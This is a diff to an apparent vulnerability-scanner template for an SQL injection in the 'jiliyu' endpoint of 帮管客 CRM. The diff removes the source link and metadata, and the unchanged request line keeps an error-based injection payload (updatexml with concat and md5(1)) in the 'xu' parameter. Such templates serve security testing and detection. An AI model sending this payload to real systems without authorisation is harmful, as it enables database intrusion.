@@ -3,12 +3,8 @@ info:
   name: 帮管客 CRM jiliyu接口 SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/fl3231gprx3v9fw8'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: fl3231gprx3v9fw8
-    fofa: 暂无
 http:
 - raw:
   - 'GET /index.php/jiliyu?keyword=1&page=1&pai=id&sou=soufast&timedsc=123&xu=and%201=(updatexml(1,concat(0x7e,(select%20md5(1)),0x7e),1)) HTTP/1.1
